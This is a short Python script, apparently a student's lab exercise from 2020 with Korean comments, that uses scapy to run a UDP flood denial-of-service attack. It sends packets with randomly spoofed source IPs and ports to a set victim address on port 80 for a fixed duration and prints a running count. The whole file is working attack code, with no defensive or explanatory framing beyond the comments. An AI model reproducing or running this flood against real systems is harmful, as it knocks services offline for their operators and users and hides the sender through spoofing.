#--------------------------------------------------------------------------------------------------------------------------------------------------------------


#                                                               2020.12.19


#                                                   정 재 훈 학 생 UDP Flood 공 격 문 작 성



from scapy.all import *

VICTIM_SERVER_IP="192.168.219.102"  #목적지 IP 설정
PORT_NUMBER = 80                    #목적지 포트 설정

duration = 100                      #공격시간 설정

timeout = time.time() + duration    #공격시간 초과여부를 timeout 변수로 저장
sent = 0

while True:
    if time.time() > timeout:       #설정한 공격시간이 지나면 종료
        break
    else:                           #지나지 않으면 아래의 내용 반복
        pass
    _ip = IP(src=RandIP(), dst=VICTIM_SERVER_IP)      #출발IP 무작위 설정 / 목적지 아이피 설정
    _udp = UDP(sport=RandShort(), dport=PORT_NUMBER)  #출발포트 무작위 설정 / 목적지 포트 설정
    send(_ip/_udp, verbose=0)                         #생성한 임의의 IP 설정으로 패킷 전송
    sent += 1
    print("UDP_Flooding_Attack Start: " + str(sent) + " sent packages " + VICTIM_SERVER_IP + " At the Port " + str(PORT_NUMBER))






#--------------------------------------------------------------------------------------------------------------------------------------------------------------
